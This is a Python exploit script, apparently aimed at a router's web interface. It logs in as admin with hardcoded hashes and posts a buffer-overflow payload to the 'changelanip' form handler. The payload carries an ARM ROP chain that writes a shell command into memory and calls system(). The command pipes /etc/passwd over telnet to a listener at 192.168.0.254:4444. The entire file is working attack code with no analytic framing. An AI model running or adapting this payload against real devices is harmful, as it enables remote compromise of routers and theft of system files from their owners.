import re
import struct
import requests
import urllib
import time

def p32(addr):
    return struct.pack("<I", addr)

def login_and_get_cookie(url, username, password_hash, old_cookie=None):
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'http://192.168.0.1/login.html',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Connection': 'close'
    }
    
    cookies = {}
    if old_cookie:
        cookies['password'] = old_cookie
    
    data = {
        'username': username,
        'password': password_hash
    }
    
    try:
        response = requests.post(url, headers=headers, data=data, cookies=cookies, allow_redirects=False, timeout=10)
        cookie_value = response.headers.get('Set-Cookie').split(';')[0].split('=', 1)[1]
        return cookie_value
    except Exception as e:
        print(f"[!] Login failed: {e}")
        return None

def logout(url, cookie_value):
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'http://192.168.0.1/main.html',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1'
    }
    
    cookies = {
        'password': cookie_value
    }
    
    try:
        response = requests.get(url, headers=headers, cookies=cookies, allow_redirects=False, timeout=5)
        return response.status_code
    except Exception as e:
        print(f"[!] Logout failed: {e}")
        return None

def send_payload_to_entry(url, cookie_value, name0, value0, funcname):
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'http://192.168.0.1/ddns_config.html?random=0.3334587919811678&',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Connection': 'close'
    }
    
    cookies = {
        'password': cookie_value
    }
    
    data = {
        'name0': name0,
        'value0': value0,
        'funcname': funcname
    }
    
    try:
        response = requests.post(url, headers=headers, data=data, cookies=cookies, allow_redirects=False, timeout=5)
        return response
    except requests.exceptions.Timeout:
        print("[*] Request timed out (expected if exploit succeeds)")
        return None
    except requests.exceptions.ConnectionError as e:
        print(f"[*] Connection error (device may have crashed): {e}")
        return None
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        return None

###### EXPLOIT CODE ######
def exploit():
    libc_base = 0x401ea000
    # libc_base = 0x402c4000
    rw_section = libc_base + 0x6e000
    payload = b'A'*0x354 + p32(rw_section + 0x604)*3 + b'B'*0x20
    #### ROP CHAIN ####
    
    call_system = 0x00A61D0
    target = b'cat /etc/passwd | telnet 192.168.0.254 4444'
    target = target.ljust(44, b' ')
    cmd_addr = rw_section + 604
    str_r3_r4 = libc_base + 0x000386f4  # str r3, [r4] ; pop {r3, r4, r5, pc}
    pop_r0 = 0x0003db80 + libc_base
    payload += p32(rw_section + 0x604)*2 # r4, r11
    payload += p32(str_r3_r4)
    for i in range(0, len(target), 4):
        chunk = target[i:i+4]
        payload += chunk # r3
        payload += p32(cmd_addr+i)  # r4
        payload += p32(rw_section + 0x608)  # r5
        payload += p32(str_r3_r4)
    payload += p32(rw_section + 0x604)*3 
    payload += p32(pop_r0) + p32(cmd_addr) 
    payload += p32(call_system)
    return payload

def check_device_alive(url='http://192.168.0.1'):
    """Check if device is responsive"""
    try:
        response = requests.get(url, timeout=3)
        return True
    except:
        return False

if __name__ == "__main__":
    attempt = 0
    max_attempts = 1  # Limit số lần thử
    
    print("[*] Starting exploit loop...")
    print("[*] Listening for reverse shell on 192.168.0.254:4444")
    
    while attempt < max_attempts:
        attempt += 1
        print(f"\n[*] Attempt {attempt}/{max_attempts}")
        
        # Check if device is alive
        if not check_device_alive():
            print("[!] Device not responding, waiting for reboot...")
            time.sleep(30)  # Đợi device reboot
            continue
        
        # Login
        print("[+] Logging in...")
        cookie = login_and_get_cookie(
            'http://192.168.0.1/login/Auth', 
            'admin', 
            '0b3bc9ce555f07d127c6da44337e364f', 
            'e6e061838856bf47e1de730719fb2609udh5gk'
        )
        
        if not cookie:
            print("[!] Login failed, retrying...")
            time.sleep(5)
            continue
        
        print(f"[+] Got cookie: {cookie}")
        
        # Send exploit
        print("[+] Sending exploit payload...")
        result = send_payload_to_entry(
            'http://192.168.0.1/goform/setcfm', 
            cookie, 
            'lan.ip', 
            exploit(), 
            'changelanip'
        )
        
        if result:
            print(f"[+] Response received: {result.status_code}")
        else:
            print("[*] No response (exploit may have succeeded)")
        
        # Đợi trước khi thử lại
        print("[*] Waiting 3 seconds before next attempt...")
        time.sleep(3)
    
    print("\n[*] Exploit attempts completed")